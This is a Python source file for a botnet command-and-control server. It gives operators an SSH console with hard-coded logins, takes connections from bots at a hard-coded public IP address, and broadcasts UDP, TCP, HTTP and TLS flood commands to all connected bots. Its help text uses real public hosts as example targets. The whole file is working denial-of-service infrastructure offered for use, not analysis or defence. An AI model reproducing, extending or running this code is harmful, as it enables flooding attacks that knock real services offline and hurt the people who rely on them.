import socket
import threading
import time
import random
import json
import sys
import os
from datetime import datetime
import paramiko

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

class SSHServer(paramiko.ServerInterface):
    def __init__(self, c2_server):
        self.c2_server = c2_server
        self.username = None
        self.event = threading.Event()
        
    def check_auth_password(self, username, password):
        self.username = username
        if username in self.c2_server.ssh_users and self.c2_server.ssh_users[username] == password:
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED
        
    def get_username(self):
        return self.username
        
    def check_channel_request(self, kind, chanid):
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED
        
    def check_channel_shell_request(self, channel):
        self.event.set()
        return True
        
    def check_channel_pty_request(self, channel, term, width, height, pixelwidth, pixelheight, modes):
        return True

class SSHC2Server:
    def __init__(self, ssh_port=1338, bot_port=1337, host='164.68.103.134'):
        self.ssh_port = ssh_port
        self.bot_port = bot_port
        self.host = host
        self.ssh_server_socket = None
        self.bot_server_socket = None
        self.running = False
        self.connected_bots = {}
        self.ssh_clients = {}
        self.attack_history = []
        
        # SSH server setup
        self.ssh_host_key = paramiko.RSAKey.generate(2048)
        self.ssh_users = {
            "admin": "admin123",
            "elbot": "elbot123"
        }
        
        # 4 METHODS EXACTLY LIKE BOT.PY
        self.attack_methods = {
            "!udp": "UDP FLOOD ATTACK - GigabitUDPFlooder",
            "!tcp": "TCP BYPASS ATTACK - UniversalTCPBypass", 
            "!http": "HTTP FLOOD ATTACK - HTTPBypassFlood",
            "!tls": "TLS FLOOD ATTACK - TLSFloodAttack"
        }

    def start(self):
        """Start both SSH and Bot servers"""
        self.running = True
        
        print(f"{Colors.CYAN}╔══════════════════════════════════════════════╗{Colors.RESET}")
        print(f"{Colors.CYAN}║           SSH C2 SERVER STARTING             ║{Colors.RESET}")
        print(f"{Colors.CYAN}║    Port {self.ssh_port}: SSH Clients          ║{Colors.RESET}")
        print(f"{Colors.CYAN}║    Port {self.bot_port}: Bot Connections      ║{Colors.RESET}")
        print(f"{Colors.CYAN}║          4 ATTACK METHODS READY              ║{Colors.RESET}")
        print(f"{Colors.CYAN}╚══════════════════════════════════════════════╝{Colors.RESET}")
        
        # Start SSH server thread
        ssh_thread = threading.Thread(target=self.start_ssh_server)
        ssh_thread.daemon = True
        ssh_thread.start()
        
        # Start Bot server thread
        bot_thread = threading.Thread(target=self.start_bot_server)
        bot_thread.daemon = True
        bot_thread.start()
        
        # Start cleanup thread
        cleanup_thread = threading.Thread(target=self.cleanup_worker)
        cleanup_thread.daemon = True
        cleanup_thread.start()
        
        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()

    def stop(self):
        """Stop the C2 server"""
        self.running = False
        print(f"{Colors.RED}[+] Stopping SSH C2 Server...{Colors.RESET}")
        
        # Close all connections
        for bot_id in list(self.connected_bots.keys()):
            try:
                self.connected_bots[bot_id]['socket'].close()
            except:
                pass
        
        for client in list(self.ssh_clients.keys()):
            try:
                self.ssh_clients[client]['transport'].close()
            except:
                pass
                
        if self.ssh_server_socket:
            self.ssh_server_socket.close()
        if self.bot_server_socket:
            self.bot_server_socket.close()

    def start_ssh_server(self):
        """Start SSH server on port 2222"""
        try:
            self.ssh_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.ssh_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.ssh_server_socket.bind((self.host, self.ssh_port))
            self.ssh_server_socket.listen(100)
            
            print(f"{Colors.GREEN}[+] SSH Server listening on port {self.ssh_port}{Colors.RESET}")
            
            while self.running:
                try:
                    client_socket, client_address = self.ssh_server_socket.accept()
                    ssh_thread = threading.Thread(
                        target=self.handle_ssh_client,
                        args=(client_socket, client_address)
                    )
                    ssh_thread.daemon = True
                    ssh_thread.start()
                except Exception as e:
                    if self.running:
                        print(f"{Colors.RED}[-] SSH Accept error: {e}{Colors.RESET}")
                        
        except Exception as e:
            print(f"{Colors.RED}[-] Failed to start SSH server: {e}{Colors.RESET}")

    def handle_ssh_client(self, client_socket, client_address):
        """Handle SSH client connections"""
        try:
            transport = paramiko.Transport(client_socket)
            transport.add_server_key(self.ssh_host_key)
            
            server = SSHServer(self)
            transport.start_server(server=server)
            
            # Wait for authentication
            channel = transport.accept(20)
            if channel is None:
                print(f"{Colors.RED}[-] SSH: No channel from {client_address[0]}{Colors.RESET}")
                transport.close()
                return
            
            # Wait for shell request
            server.event.wait(10)
            if not server.event.is_set():
                print(f"{Colors.RED}[-] SSH: No shell request from {client_address[0]}{Colors.RESET}")
                transport.close()
                return
                
            username = server.get_username()
            self.ssh_clients[username] = {
                'channel': channel,
                'transport': transport,
                'ip': client_address[0],
                'login_time': datetime.now()
            }
            
            print(f"{Colors.GREEN}[+] SSH Client: {username} from {client_address[0]}{Colors.RESET}")
            
            # Send welcome message
            welcome_msg = self.get_ssh_banner()
            channel.send(welcome_msg)
            
            # Handle SSH session
            self.handle_ssh_session(channel, username, client_address)
            
        except Exception as e:
            print(f"{Colors.RED}[-] SSH Client error: {e}{Colors.RESET}")
            try:
                client_socket.close()
            except:
                pass

    def get_ssh_banner(self):
        """SSH login banner"""
        return f"""{Colors.CYAN}
 ██▀███   ██▓ ██▓███   ██▓███  ▓█████  ██▀███    ██████ ▓█████  ▄████▄  
▓██ ▒ ██▒▓██▒▓██░  ██▒▓██░  ██▒▓█   ▀ ▓██ ▒ ██▒▒██    ▒ ▓█   ▀ ▒██▀ ▀█  
▓██ ░▄█ ▒▒██▒▓██░ ██▓▒▓██░ ██▓▒▒███   ▓██ ░▄█ ▒░ ▓██▄   ▒███   ▒▓█    ▄ 
▒██▀▀█▄  ░██░▒██▄█▓▒ ▒▒██▄█▓▒ ▒▒▓█  ▄ ▒██▀▀█▄    ▒   ██▒▒▓█  ▄ ▒▓▓▄ ▄██▒
░██▓ ▒██▒░██░▒██▒ ░  ░▒██▒ ░  ░░▒████▒░██▓ ▒██▒▒██████▒▒░▒████▒▒ ▓███▀ ░
░ ▒▓ ░▒▓░░▓  ▒▓▒░ ░  ░▒▓▒░ ░  ░░░ ▒░ ░░ ▒▓ ░▒▓░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ░▒ ▒  ░
  ░▒ ░ ▒░ ▒ ░░▒ ░     ░▒ ░      ░ ░  ░  ░▒ ░ ▒░░ ░▒  ░ ░ ░ ░  ░  ░  ▒   
  ░░   ░  ▒ ░░░       ░░          ░     ░░   ░ ░  ░  ░     ░   ░        
   ░      ░                       ░  ░   ░           ░     ░  ░░ ░      
                                                               ░        {Colors.RESET}

{Colors.GREEN}Available Methods:{Colors.RESET}
{Colors.YELLOW}!udp{Colors.RESET}  - GigabitUDPFlooder
{Colors.YELLOW}!tcp{Colors.RESET}  - UniversalTCPBypass
{Colors.YELLOW}!http{Colors.RESET} - HTTPBypassFlood  
{Colors.YELLOW}!tls{Colors.RESET}  - TLSFloodAttack

{Colors.CYAN}Type 'help' for commands{Colors.RESET}

"""

    def handle_ssh_session(self, channel, username, client_address):
        """Handle SSH command session with proper line buffering"""
        try:
            prompt = f"\r\n{Colors.CYAN}{username}@{client_address[0]} > {Colors.RESET}"
            channel.send(prompt)
            
            buffer = ""
            while self.running and not channel.closed:
                if channel.recv_ready():
                    try:
                        # Read available data
                        data = channel.recv(1024)
                        if not data:
                            break
                            
                        # Decode the data
                        text = data.decode('utf-8')
                        
                        # Handle backspace/delete
                        if '\x7f' in text or '\b' in text:
                            if len(buffer) > 0:
                                buffer = buffer[:-1]
                                # Send backspace sequence to clear character
                                channel.send('\b \b')
                            continue
                            
                        # Handle carriage return (Enter key)
                        if '\r' in text or '\n' in text:
                            if buffer.strip():
                                command = buffer.strip()
                                buffer = ""
                                
                                if command.lower() in ['exit', 'quit']:
                                    channel.send(f"\r\n{Colors.YELLOW}Disconnecting...{Colors.RESET}\r\n")
                                    break
                                    
                                # Process command
                                response = self.process_ssh_command(command, username)
                                channel.send(f"\r\n{response}\r\n")
                            
                            # Send new prompt
                            channel.send(prompt)
                            continue
                            
                        # Add characters to buffer
                        for char in text:
                            # Only add printable characters
                            if char.isprintable():
                                buffer += char
                                # Echo the character back
                                channel.send(char)
                                
                    except UnicodeDecodeError:
                        # Ignore encoding errors
                        pass
                    except Exception as e:
                        print(f"{Colors.RED}[-] SSH Session read error: {e}{Colors.RESET}")
                        break
                    
        except Exception as e:
            print(f"{Colors.RED}[-] SSH Session error: {e}{Colors.RESET}")
        finally:
            if username in self.ssh_clients:
                del self.ssh_clients[username]
            try:
                channel.close()
            except:
                pass
            print(f"{Colors.RED}[-] SSH Client Disconnected: {username}{Colors.RESET}")

    def process_ssh_command(self, command, username):
        """Process SSH commands"""
        parts = command.split()
        if not parts:
            return "Invalid command"
            
        cmd = parts[0]
        
        if cmd == "help":
            return self.show_ssh_help()
        elif cmd == "bots":
            return self.show_bots()
        elif cmd == "methods":
            return self.show_methods()
        elif cmd == "attacks":
            return self.show_attacks()
        elif cmd.startswith("!"):
            return self.handle_attack_command(command, username)
        elif cmd == "clear":
            return "\033c" + self.get_ssh_banner()
        elif cmd == "whoami":
            return f"User: {username} | Role: SSH Client | Bots: {len(self.connected_bots)}"
        elif cmd == "exit" or cmd == "quit":
            return "Use 'exit' to disconnect"
        else:
            return f"Unknown command: {cmd}"

    def show_ssh_help(self):
        """Show SSH help"""
        return f"""
{Colors.GREEN}SSH C2 Commands:{Colors.RESET}
{Colors.YELLOW}help{Colors.RESET}     - Show this help
{Colors.YELLOW}bots{Colors.RESET}     - Show connected bots
{Colors.YELLOW}methods{Colors.RESET}  - Show attack methods  
{Colors.YELLOW}attacks{Colors.RESET}  - Show ongoing attacks
{Colors.YELLOW}!method{Colors.RESET}  - Launch attack
{Colors.YELLOW}clear{Colors.RESET}    - Clear screen
{Colors.YELLOW}whoami{Colors.RESET}   - Show user info
{Colors.YELLOW}exit{Colors.RESET}     - Disconnect

{Colors.CYAN}Attack Format:{Colors.RESET}
{Colors.WHITE}!method target port duration [attack_id]{Colors.RESET}

{Colors.CYAN}Examples:{Colors.RESET}
{Colors.WHITE}!udp 8.8.8.8 80 60 attack_123{Colors.RESET}
{Colors.WHITE}!tcp google.com 443 120 attack_456{Colors.RESET}
{Colors.WHITE}!http target.com 80 30 attack_789{Colors.RESET}
{Colors.WHITE}!tls example.com 443 60 attack_999{Colors.RESET}
"""

    def show_bots(self):
        """Show connected bots"""
        if not self.connected_bots:
            return f"{Colors.YELLOW}No bots connected{Colors.RESET}"
        
        result = f"{Colors.GREEN}Connected Bots ({len(self.connected_bots)}):{Colors.RESET}\n"
        for bot_id, bot_info in self.connected_bots.items():
            result += f"{Colors.CYAN}• {bot_id}{Colors.RESET} - {bot_info['ip']} - {bot_info['system_info']}\n"
        return result

    def show_methods(self):
        """Show attack methods"""
        methods = f"{Colors.GREEN}Available Methods:{Colors.RESET}\n"
        for method, desc in self.attack_methods.items():
            methods += f"{Colors.YELLOW}• {method}{Colors.RESET}: {desc}\n"
        return methods

    def show_attacks(self):
        """Show ongoing attacks"""
        ongoing = [a for a in self.attack_history if a.get('status') == 'running']
        if not ongoing:
            return f"{Colors.YELLOW}No ongoing attacks{Colors.RESET}"
        
        result = f"{Colors.GREEN}Ongoing Attacks:{Colors.RESET}\n"
        for attack in ongoing:
            result += f"{Colors.RED}• {attack['id']} | {attack['target']} | {attack['method']} | {attack['duration']}s{Colors.RESET}\n"
        return result

    def handle_attack_command(self, command, username):
        """Handle attack commands - PERFECTLY COMPATIBLE WITH BOT.PY"""
        parts = command.split()
        if len(parts) < 4:
            return f"{Colors.RED}Usage: !method target port duration [attack_id]{Colors.RESET}"
        
        method = parts[0]  # !udp, !tcp, !http, !tls
        target = parts[1]
        port = parts[2]
        duration = parts[3]
        attack_id = parts[4] if len(parts) > 4 else f"attack_{int(time.time())}_{random.randint(1000,9999)}"
        
        if method not in self.attack_methods:
            return f"{Colors.RED}Invalid method. Available: {', '.join(self.attack_methods.keys())}{Colors.RESET}"
        
        if not self.connected_bots:
            return f"{Colors.RED}No bots available{Colors.RESET}"
        
        # Build command EXACTLY like bot.py expects
        attack_command = f"{method} {target} {port} {duration} {attack_id}"
        
        # Send to all bots
        successful = 0
        for bot_id, bot_info in self.connected_bots.items():
            try:
                command_msg = {
                    'type': 'command',
                    'command': attack_command
                }
                bot_info['socket'].send(json.dumps(command_msg).encode() + b'\n')
                successful += 1
                print(f"{Colors.GREEN}[+] Sent to {bot_id}: {attack_command}{Colors.RESET}")
            except Exception as e:
                print(f"{Colors.RED}[-] Failed to send to {bot_id}: {e}{Colors.RESET}")
        
        # Record attack
        attack_record = {
            'id': attack_id,
            'target': f"{target}:{port}",
            'method': method[1:].upper(),
            'duration': duration,
            'start_time': datetime.now().strftime("%H:%M:%S"),
            'status': 'running',
            'bots_used': successful
        }
        self.attack_history.append(attack_record)
        
        return f"""
{Colors.GREEN}✅ ATTACK LAUNCHED!{Colors.RESET}

{Colors.CYAN}Target:{Colors.RESET} {target}:{port}
{Colors.CYAN}Method:{Colors.RESET} {method[1:].upper()}
{Colors.CYAN}Duration:{Colors.RESET} {duration}s
{Colors.CYAN}Bots:{Colors.RESET} {successful}/{len(self.connected_bots)}
{Colors.CYAN}Attack ID:{Colors.RESET} {attack_id}

{Colors.YELLOW}Use 'stop {attack_id}' to cancel{Colors.RESET}
"""

    def start_bot_server(self):
        """Start bot connection server on port 1337 - COMPATIBLE WITH BOT.PY"""
        try:
            self.bot_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.bot_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.bot_server_socket.bind((self.host, self.bot_port))
            self.bot_server_socket.listen(100)
            
            print(f"{Colors.GREEN}[+] Bot Server listening on port {self.bot_port}{Colors.RESET}")
            
            while self.running:
                try:
                    bot_socket, bot_address = self.bot_server_socket.accept()
                    bot_thread = threading.Thread(
                        target=self.handle_bot_connection,
                        args=(bot_socket, bot_address)
                    )
                    bot_thread.daemon = True
                    bot_thread.start()
                except Exception as e:
                    if self.running:
                        print(f"{Colors.RED}[-] Bot Accept error: {e}{Colors.RESET}")
                        
        except Exception as e:
            print(f"{Colors.RED}[-] Failed to start bot server: {e}{Colors.RESET}")

    def handle_bot_connection(self, bot_socket, bot_address):
        """Handle bot connections - COMPATIBLE WITH BOT.PY FORMAT"""
        try:
            # Set timeout for initial handshake
            bot_socket.settimeout(10.0)
            
            # Receive bot identification (JSON format from bot.py)
            data = bot_socket.recv(1024).decode('utf-8').strip()
            if not data:
                bot_socket.close()
                return
                
            try:
                bot_data = json.loads(data)
                
                # EXACTLY what bot.py sends
                bot_id = bot_data.get('bot_id', f"Bot-{random.randint(1000,9999)}")
                system_info = bot_data.get('system', 'Unknown')
                version = bot_data.get('version', '1.0')
                
                # Register bot
                bot_info = {
                    'id': bot_id,
                    'ip': bot_address[0],
                    'socket': bot_socket,
                    'system_info': system_info,
                    'version': version,
                    'last_seen': datetime.now(),
                    'status': 'online'
                }
                
                self.connected_bots[bot_id] = bot_info
                
                # Send acknowledgment (what bot.py expects)
                ack = {
                    'status': 'connected',
                    'message': 'Welcome to SSH C2',
                    'server_time': datetime.now().isoformat()
                }
                bot_socket.send(json.dumps(ack).encode())
                
                print(f"{Colors.GREEN}[+] Bot Connected: {bot_id}{Colors.RESET}")
                print(f"{Colors.BLUE}    IP: {bot_address[0]} | System: {system_info}{Colors.RESET}")
                print(f"{Colors.BLUE}    Total Bots: {len(self.connected_bots)}{Colors.RESET}")
                
                # Remove timeout for normal operation
                bot_socket.settimeout(None)
                
                # Start monitoring this bot
                bot_thread = threading.Thread(
                    target=self.monitor_bot,
                    args=(bot_id, bot_socket)
                )
                bot_thread.daemon = True
                bot_thread.start()
                
            except json.JSONDecodeError:
                print(f"{Colors.RED}[-] Invalid bot data from {bot_address[0]}{Colors.RESET}")
                bot_socket.close()
                
        except socket.timeout:
            print(f"{Colors.RED}[-] Bot handshake timeout from {bot_address[0]}{Colors.RESET}")
            bot_socket.close()
        except Exception as e:
            print(f"{Colors.RED}[-] Bot connection error: {e}{Colors.RESET}")
            try:
                bot_socket.close()
            except:
                pass

    def monitor_bot(self, bot_id, bot_socket):
        """Monitor bot for messages - COMPATIBLE WITH BOT.PY MESSAGES"""
        buffer = ''
        while bot_id in self.connected_bots and self.running:
            try:
                data = bot_socket.recv(4096).decode('utf-8', errors='ignore')
                
                if not data:
                    break
                    
                buffer += data
                
                # Process complete JSON messages (like bot.py sends)
                while buffer:
                    try:
                        # Try to parse complete JSON
                        message = json.loads(buffer)
                        self.handle_bot_message(bot_id, message)
                        buffer = ''
                        break
                    except json.JSONDecodeError:
                        # Look for complete JSON object
                        if buffer.count('{') == buffer.count('}') and buffer.count('{') > 0:
                            start_idx = buffer.find('{')
                            end_idx = buffer.rfind('}') + 1
                            if start_idx < end_idx:
                                json_str = buffer[start_idx:end_idx]
                                try:
                                    message = json.loads(json_str)
                                    self.handle_bot_message(bot_id, message)
                                    buffer = buffer[end_idx:]
                                except:
                                    buffer = ''
                                    break
                        else:
                            # Wait for more data
                            break
                            
            except socket.timeout:
                # Normal timeout, continue
                continue
            except Exception as e:
                break
                
        # Bot disconnected
        if bot_id in self.connected_bots:
            del self.connected_bots[bot_id]
            print(f"{Colors.RED}[-] Bot Disconnected: {bot_id}{Colors.RESET}")

    def handle_bot_message(self, bot_id, message):
        """Handle messages from bots - COMPATIBLE WITH BOT.PY MESSAGE TYPES"""
        msg_type = message.get('type')
        
        if msg_type == 'heartbeat':
            # Update bot last seen
            if bot_id in self.connected_bots:
                self.connected_bots[bot_id]['last_seen'] = datetime.now()
                
        elif msg_type == 'attack_complete':
            # Attack completed notification
            attack_id = message.get('attack_id')
            attack_type = message.get('attack_type')
            target = message.get('target')
            
            print(f"{Colors.GREEN}[+] Attack Completed: {attack_id} by {bot_id}{Colors.RESET}")
            print(f"{Colors.BLUE}    Target: {target} | Type: {attack_type}{Colors.RESET}")
            
            # Update attack history
            for attack in self.attack_history:
                if attack['id'] == attack_id:
                    attack['status'] = 'completed'
                    attack['end_time'] = datetime.now().strftime("%H:%M:%S")
                    break
                    
        elif msg_type == 'response':
            # General response from bot
            response = message.get('response', '')
            print(f"{Colors.CYAN}[~] {bot_id}: {response}{Colors.RESET}")
            
        elif msg_type == 'error':
            # Error from bot
            error = message.get('error', 'Unknown error')
            print(f"{Colors.RED}[-] {bot_id} Error: {error}{Colors.RESET}")

    def cleanup_worker(self):
        """Clean up dead connections"""
        while self.running:
            time.sleep(30)
            
            # Clean dead bots
            dead_bots = []
            for bot_id, bot_info in self.connected_bots.items():
                last_seen = bot_info['last_seen']
                if (datetime.now() - last_seen).total_seconds() > 60:  # 1 minute timeout
                    dead_bots.append(bot_id)
            
            for bot_id in dead_bots:
                try:
                    self.connected_bots[bot_id]['socket'].close()
                except:
                    pass
                del self.connected_bots[bot_id]
                print(f"{Colors.RED}[-] Bot Timeout: {bot_id}{Colors.RESET}")

def main():
    """Main function"""
    print(f"{Colors.CYAN}Starting SSH C2 Server...{Colors.RESET}")
    
    # Create and start C2 server
    c2_server = SSHC2Server(
        ssh_port=1338,    # SSH clients connect here
        bot_port=1337,    # Bots connect here  
        host='164.68.103.134'
    )
    
    try:
        c2_server.start()
    except KeyboardInterrupt:
        c2_server.stop()
    except Exception as e:
        print(f"{Colors.RED}Error: {e}{Colors.RESET}")
        c2_server.stop()

if __name__ == "__main__":
    main()
